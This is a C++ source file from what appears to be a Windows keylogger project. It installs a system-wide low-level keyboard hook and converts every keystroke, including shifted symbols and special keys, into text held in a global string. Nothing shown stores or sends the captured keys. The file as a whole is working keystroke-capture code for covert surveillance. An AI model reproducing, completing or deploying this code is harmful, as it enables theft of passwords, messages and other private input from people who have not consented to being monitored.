#include "keylogger.hpp"
#include <windows.h>
#include <string>
#include <algorithm>

namespace keylogger {

	std::string key = "";

	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) 
	{
		BOOL fEatKeystroke = FALSE;
		if (nCode == HC_ACTION) 
		{
			if (wParam == WM_KEYDOWN) 
			{
				PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
				if (p->vkCode >= 0x41 && p->vkCode <= 0x5A) 
				{
					key = static_cast<char>(p->vkCode);
					if (!(GetAsyncKeyState(VK_SHIFT) || (GetKeyState(VK_CAPITAL) & 0x00001))) 
					{
						std::transform(key.begin(), key.end(), key.begin(), [](unsigned char c){
							return std::tolower(c);
						});
					}
				} else 
				{
					switch(p->vkCode) 
					{
						case 0x30: if (GetAsyncKeyState(VK_SHIFT)) key = ")"; else key = "0";	break;
						case 0x31: if (GetAsyncKeyState(VK_SHIFT)) key = "!"; else key = "1";	break;
						case 0x32: if (GetAsyncKeyState(VK_SHIFT)) key = "@"; else key = "2";	break;
						case 0x33: if (GetAsyncKeyState(VK_SHIFT)) key = "#"; else key = "3";	break;
						case 0x34: if (GetAsyncKeyState(VK_SHIFT)) key = "$"; else key = "4";	break;
						case 0x35: if (GetAsyncKeyState(VK_SHIFT)) key = "%"; else key = "5";	break;
						case 0x36: if (GetAsyncKeyState(VK_SHIFT)) key = "^"; else key = "6";	break;
						case 0x37: if (GetAsyncKeyState(VK_SHIFT)) key = "&"; else key = "7";	break;
						case 0x38: if (GetAsyncKeyState(VK_SHIFT)) key = "*"; else key = "8";	break;
						case 0x39: if (GetAsyncKeyState(VK_SHIFT)) key = "("; else key = "9";	break;
						case 0xBD: if (GetAsyncKeyState(VK_SHIFT)) key = "_"; else key = "-";	break;
						case 0xBF: if (GetAsyncKeyState(VK_SHIFT)) key = "?"; else key = "/";	break;
						case 0xDC: if (GetAsyncKeyState(VK_SHIFT)) key = "|"; else key = "\\";	break;
						case 0xDD: if (GetAsyncKeyState(VK_SHIFT)) key = "}"; else key = "]";	break;
						case 0xDB: if (GetAsyncKeyState(VK_SHIFT)) key = "{"; else key = "[";	break;
						case 0xDE: if (GetAsyncKeyState(VK_SHIFT)) key = "\""; else key = "'";	break;
						case 0xBA: if (GetAsyncKeyState(VK_SHIFT)) key = ":"; else key = ";";	break;
						case 0xBE: if (GetAsyncKeyState(VK_SHIFT)) key = ">"; else key = ".";	break;
						case 0xBC: if (GetAsyncKeyState(VK_SHIFT)) key = "<"; else key = ",";	break;
						case 0xBB: if (GetAsyncKeyState(VK_SHIFT)) key = "+"; else key = "=";	break;
						case 0xC0: if (GetAsyncKeyState(VK_SHIFT)) key = "~"; else key = "`";	break;
						case VK_UP:		key = "<UP>";			break;
						case VK_DOWN:		key = "<DOWN>"; 		break;
						case VK_BACK:		key = "<BACKSPACE>";		break;
						case VK_SPACE:		key = " ";			break;
						case VK_ESCAPE:		key = "<ESCAPE>";		break;
						case VK_TAB:		key = "<TAB>";			break;
						case VK_RETURN:		key = "\n";			break;
					}
				}
			}
		}
		return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
	}

	void process() 
	{

		// Install the low-level keyboard & mouse hooks
		HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);

		// Keep this app running until we're told to stop
		MSG msg;

		while (true) 
		{
			bool status = GetMessage(&msg, 0, 0, 0); //this while loop keeps the hook
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}

		UnhookWindowsHookEx(hhkLowLevelKybd);

	}

}
